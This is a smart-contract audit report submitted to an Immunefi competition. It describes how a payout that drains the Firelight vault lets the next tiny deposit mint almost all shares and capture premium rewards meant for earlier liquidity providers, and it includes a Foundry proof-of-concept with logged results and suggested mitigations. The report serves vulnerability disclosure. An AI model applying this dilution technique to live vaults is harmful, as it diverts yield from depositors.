# 89500 sc medium a deposit placed right after a payout drains the vault mints shares against a near zero totalassets the premium income pre incident lps underwrote for goes to whoever deposi&#x20;

**Submitted on Aug 19th 2026 at 16:42:56 UTC by @Web3Vinay for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89500
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

`FirelightVault` prices new deposits against the live `totalSupply()`/`totalAssets()` ratio. A single legitimate incident `payout()` can drive `totalAssets()` to exactly `0` while `totalSupply()` stays at its full pre-incident value, because `payout()` moves assets but never burns shares. Once that state exists, the very next `deposit()` — however small — is priced against a near-zero denominator and mints shares that dwarf the entire pre-incident supply. `VaultRewardDistributor.distributeRewards()` — which specifically forwards premium-sale proceeds collected against capacity the pre-incident LPs' capital was backing — then credits the vault with new assets but mints no shares at all, so that income is split strictly by current share ownership, not by who actually earned it (`distributeIncentive()`, a separate general-purpose incentive channel, shares the same no-share-mint mechanism). Net effect: the LPs who funded the vault before the incident and bore its loss receive almost none of the reward income that follows — nearly all of it goes to whichever deposit happened to land first after the drain.

## Vulnerability Details

`payout()` drains active assets but never touches `totalSupply()`:

```solidity
// contracts/core/FirelightVault.sol:892-966
function payout(address to, uint256 amount, uint48 captureTimestamp)
    external onlyRole(PAYOUT_ROLE) nonReentrant returns (uint256 paidAmount)
{
    ...
    paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
    ...
@>  IERC20(asset()).safeTransfer(to, paidAmount);   // :962 — the only state-changing external call; no _burn anywhere in this function
}
```

The next deposit's share math (`totalSupply` and `totalAssets` are the *live* values at call time):

```solidity
// contracts/core/FirelightVault.sol:1058-1064
function _convertToSharesTotals(uint256 assets, uint256 totSupply, uint256 totAssets, Math.Rounding rounding)
    private view returns (uint256)
{
@>  return assets.mulDiv(totSupply + 10 ** _decimalsOffset(), totAssets + 1, rounding);
}
```

`_decimalsOffset()` is unoverridden anywhere in the contract (OZ default `0`, so `10 ** _decimalsOffset() == 1`). At `totAssets == 0` this collapses to `shares = assets * (totSupply + 1)` — linear in the deposit size with a multiplier equal to the *entire* pre-incident supply. `deposit()`'s only guard is `shares == 0` (`:667-669`), which protects the opposite regime (price too high, dust deposit rounds to zero) and does nothing here, since `shares` is enormous, not zero.

The gate that blocks deposits while an incident is open clears in the *same transaction* as the payout that drains the vault — no waiting period is needed. `approveCurrentAssessment` executes the payout and then immediately closes the incident:

```solidity
// contracts/core/IncidentManager.sol:422-436
uint256 vaultPaidAmount = _executePayout(...);   // :422 — drains the vault via vault.payout()
incident.status = IncidentStatus.CLOSED;          // :434
_decreaseIncident(incident.period);               // :436
```

```solidity
// contracts/core/IncidentManager.sol:819-830
function _decreaseIncident(uint256 period) internal {
    ...
    if (count == 0) {
@>      $.vault.setActiveIncident(period, false);   // clears FirelightVault's deposit gate, same tx as the drain
    }
}
```

The reward/incentive channel that follows credits the vault with no share issuance at all, by design:

```solidity
// contracts/core/VaultRewardDistributor.sol:132-153
function distributeRewards(uint256 vaultAssetAmount, ...) external onlyRole(DISTRIBUTOR_ROLE) {
    ...
@>  $.vaultAsset.safeTransferFrom(msg.sender, address(_vault), vaultAssetAmount);   // raw transfer, no vault.deposit()/mint() call anywhere
    _vault.checkpointTotalAssets();
}
```

Its own NatSpec confirms this is intentional for the distributor's role: *"The contract does not perform swaps or mint vault shares. It only pulls vault assets from authorized distributors, transfers them directly to the vault..."* — but nothing anywhere accounts for what that combination does when `totalAssets()` has just been driven to zero and a fresh deposit has just captured most of `totalSupply()`.

## Impact Details

* `distributeRewards` only ever fires because cover buyers paid premium against capacity that the pre-incident LPs' capital was backing at the time (`VaultRewardDistributor.sol:121-122`, "*Forwards premium-sale proceeds into the vault*"; premium is pulled from the buyer at `CoverOrderAllocator.sol:535`). That premium income is what the old LPs took on the underwriting risk *for* — it never carries any share issuance, so once it lands it is split purely by whoever holds shares at that moment, not by who actually earned it. The incident is what let a brand-new depositor, who backed none of the cover that generated it, collect nearly all of it instead.
* A $10 deposit that lands right after the drain ends up owning **99.99%+ of the vault** (measured in the PoC below), while the old LP's shares — still the entire pre-incident supply — are diluted to **under 0.01% ownership**, with no manipulation on either side.
* No malicious input anywhere in the chain: the payout is a normal, correctly-capped `payout()` call, the deposit is an ordinary `deposit()`, and the reward distribution is `VaultRewardDistributor` operating exactly as documented. Exact dollar figures for a $1,000,000 pre-incident LP and a $50,000 reward are in the PoC output below.

## Mitigation

* `deposit()`/`mint()` should revert once the vault is in a "crashed" state — i.e. `totalSupply() > 0` but `totalAssets()` has fallen far below what's proportionate to it (e.g. `totalAssets() < totalSupply() / K` for some chosen `K`) — instead of silently pricing new shares off a near-zero denominator.
* Recovery from that state should be an explicit, governance-gated action, not a side effect of the next ordinary deposit — e.g. `CONFIG_ADMIN_ROLE`/DAO either re-seeds `totalAssets()` back to a healthy ratio, or proportionally burns `totalSupply()` to match the real post-loss value, before normal deposits are re-enabled.

## References

<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1058-L1064>

<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L892-L966>

<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/VaultRewardDistributor.sol#L132-L153>

<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L819-L830>

## Proof of Concept

## Proof of Concept

One LP, one ordinary later depositor, no malicious actor. Save as `test/PostLossShareHijack.t.sol` and run `forge test --match-contract PostLossShareHijackReportPoC -vv`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {FirelightVault} from "../contracts/core/FirelightVault.sol";
import {IFirelightVault} from "../contracts/core/interfaces/IFirelightVault.sol";
import {VaultRewardDistributor} from "../contracts/core/VaultRewardDistributor.sol";

contract PLSHReportToken is ERC20 {
    constructor() ERC20("Mock FXRP", "mFXRP") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract PostLossShareHijackReportPoC is Test {
    address internal constant ADMIN = address(0xA11CE);
    address internal constant PAYOUT_EXEC = address(0xFA1);
    address internal constant INCIDENT_ADMIN = address(0xFA2);
    address internal constant ALLOWLIST_ADMIN = address(0xFA3);
    address internal constant CLAIMANT = address(0xC7A1);        // allowlisted payout receiver
    address internal constant OLD_LP = address(0x0157);          // pre-incident LP, bore the loss
    address internal constant NEW_DEPOSITOR = address(0xD0509);  // arrives right after the drain
    address internal constant DISTRIBUTOR_EOA = address(0xD157); // funds the reward distribution

    FirelightVault internal vault;
    PLSHReportToken internal token;
    VaultRewardDistributor internal distributor;

    function setUp() public {
        vm.warp(1_800_000_000);
        token = new PLSHReportToken();

        FirelightVault impl = new FirelightVault();
        IFirelightVault.InitParams memory p = IFirelightVault.InitParams({
            defaultAdmin: ADMIN, limitUpdater: ADMIN, blocklister: ADMIN, pauser: ADMIN,
            periodConfigurationUpdater: ADMIN, rescuer: ADMIN,
            depositLimit: type(uint128).max, periodConfigurationDuration: 1 days
        });
        vault = FirelightVault(address(new ERC1967Proxy(address(impl),
            abi.encodeCall(FirelightVault.initialize,
                (IERC20(address(token)), "Firelight Vault", "fvFXRP", abi.encode(p))))));

        vm.startPrank(ADMIN);
        vault.grantRole(vault.PAYOUT_ROLE(), PAYOUT_EXEC);
        vault.grantRole(vault.INCIDENT_ROLE(), INCIDENT_ADMIN);
        vault.grantRole(vault.PAYOUT_ALLOWLIST_ROLE(), ALLOWLIST_ADMIN);
        vm.stopPrank();

        vm.prank(ALLOWLIST_ADMIN);
        vault.addToPayoutAllowlist(CLAIMANT);

        VaultRewardDistributor distImpl = new VaultRewardDistributor();
        distributor = VaultRewardDistributor(address(new ERC1967Proxy(address(distImpl),
            abi.encodeCall(VaultRewardDistributor.initialize,
                (IFirelightVault(address(vault)), ADMIN, DISTRIBUTOR_EOA, address(0))))));

        bytes32 checkpointRole = vault.CHECKPOINT_ROLE();
        vm.prank(ADMIN);
        vault.grantRole(checkpointRole, address(distributor));
    }

    function test_newDepositorAfterPayoutCapturesOldLpsFutureRewards() public {
        // -- an ordinary LP funds the live vault, no manipulation --
        uint256 principal = 1_000_000e6; // $1,000,000, 6-decimal asset
        token.mint(OLD_LP, principal);
        vm.startPrank(OLD_LP);
        token.approve(address(vault), principal);
        vault.deposit(principal, OLD_LP);
        vm.stopPrank();

        // -- a legitimate incident is opened and a total-loss claim is paid --
        uint256 capturePeriod = vault.currentPeriod();
        vm.prank(INCIDENT_ADMIN);
        vault.setActiveIncident(capturePeriod, true);

        uint256 activeAssets = vault.totalAssets();
        vm.prank(PAYOUT_EXEC);
        vault.payout(CLAIMANT, activeAssets, uint48(vm.getBlockTimestamp()));

        // -- incident closes: IncidentManager._decreaseIncident (IncidentManager.sol:819-830)
        // clears the vault's deposit gate synchronously, in the SAME transaction as the payout
        // above (approveCurrentAssessment, IncidentManager.sol:422-436) -- no waiting period.
        vm.prank(INCIDENT_ADMIN);
        vault.setActiveIncident(capturePeriod, false);

        console2.log("totalAssets() after payout   =", vault.totalAssets());
        console2.log("totalSupply() after payout   =", vault.totalSupply());

        // -- a new depositor arrives right after, in the very next call. Not a donation,
        // not a manipulated call -- an ordinary deposit() for a modest $10. --
        uint256 newDeposit = 10e6;
        token.mint(NEW_DEPOSITOR, newDeposit);
        vm.startPrank(NEW_DEPOSITOR);
        token.approve(address(vault), newDeposit);
        uint256 newShares = vault.deposit(newDeposit, NEW_DEPOSITOR);
        vm.stopPrank();

        uint256 oldLpShares = vault.balanceOf(OLD_LP);
        uint256 totalShares = vault.totalSupply();
        console2.log("new depositor outlay          =", newDeposit);
        console2.log("new depositor shares minted   =", newShares);
        console2.log("old LP shares (unchanged)     =", oldLpShares);
        console2.log("old LP ownership (bps)        =", oldLpShares * 10_000 / totalShares);

        // -- the vault's routine, documented reward-income channel fires, exactly as
        // VaultRewardDistributor.distributeRewards() is meant to work: a raw ERC20 transfer
        // into the vault, no shares minted. --
        uint256 reward = 50_000e6;
        token.mint(DISTRIBUTOR_EOA, reward);
        vm.startPrank(DISTRIBUTOR_EOA);
        token.approve(address(distributor), reward);
        distributor.distributeRewards(reward, address(0xdeadbeef), 1, uint48(vm.getBlockTimestamp()));
        vm.stopPrank();

        // -- both parties exit and claim what the vault actually owes them --
        vm.prank(OLD_LP);
        vault.redeem(oldLpShares, OLD_LP, OLD_LP);
        vm.prank(NEW_DEPOSITOR);
        vault.redeem(newShares, NEW_DEPOSITOR, NEW_DEPOSITOR);

        uint256 claimPeriod = vault.currentPeriod() + 1;
        vm.warp(vm.getBlockTimestamp() + 2 days);

        vm.prank(OLD_LP);
        uint256 oldLpGot = vault.claimWithdraw(claimPeriod);
        vm.prank(NEW_DEPOSITOR);
        uint256 newDepositorGot = vault.claimWithdraw(claimPeriod);

        console2.log("reward distributed             =", reward);
        console2.log("old LP received (of the reward)=", oldLpGot);
        console2.log("new depositor received         =", newDepositorGot);
        console2.log("old LP share of reward (bps)   =", oldLpGot * 10_000 / reward);

        // the LP who supplied the vault's entire $1,000,000 and bore the incident loss
        // receives only dust from the very next reward distribution -- almost all of it
        // goes to the $10 deposit that happened to land first.
        assertLt(oldLpGot * 10_000 / reward, 10, "old LP should receive well under 0.10% of the reward");
        assertGt(newDepositorGot, reward * 9990 / 10_000, "new depositor should receive over 99.90% of the reward");
    }
}
```

Result (actually run — `forge test --match-contract PostLossShareHijackReportPoC -vv`):

```
Ran 1 test for audit-data/foundry/PostLossShareHijackReportPoC.t.sol:PostLossShareHijackReportPoC
[PASS] test_newDepositorAfterPayoutCapturesOldLpsFutureRewards() (gas: 930116)
Logs:
  totalAssets() after payout   = 0
  totalSupply() after payout   = 1000000000000
  new depositor outlay          = 10000000
  new depositor shares minted   = 10000000000010000000
  old LP shares (unchanged)     = 1000000000000
  old LP ownership (bps)        = 0
  reward distributed             = 50000000000
  old LP received (of the reward)= 5000
  new depositor received         = 50009995000
  old LP share of reward (bps)   = 0

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

The LP who supplied the vault's entire $1,000,000 and bore the incident's loss receives **$0.005** of the following $50,000 reward distribution — a $10 deposit that landed first receives **$50,009.995**.
